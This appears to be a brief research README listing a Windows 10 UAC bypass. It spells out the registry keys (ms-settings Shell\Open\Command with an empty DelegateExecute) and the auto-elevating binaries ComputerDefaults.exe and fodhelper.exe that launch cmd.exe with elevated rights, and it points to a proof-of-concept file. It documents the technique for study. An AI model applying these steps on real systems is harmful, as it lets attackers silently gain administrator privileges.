# uac_bypasses
UAC Bypasses discovered while studying UAC/appinfo.dll and AutoElevate binaries.

Probably all of the bypasses listed here are known.

OS: Windows 10 Pro Version	10.0.17763 Build 17763


## ComputerDefaults.exe / fodhelper.exe
PoC File: computerdefaults_fodhelper_poc.cpp

Key #1: HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command\\(Default) -> "C:\Windows\System32\cmd.exe"

Key #2: HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command\DelegateExecute -> ""

Execute C:\Windows\system32\\{ComputerDefaults.exe,fodhelper.exe}

[PoC Image](https://i.imgur.com/oXFHduE.png)
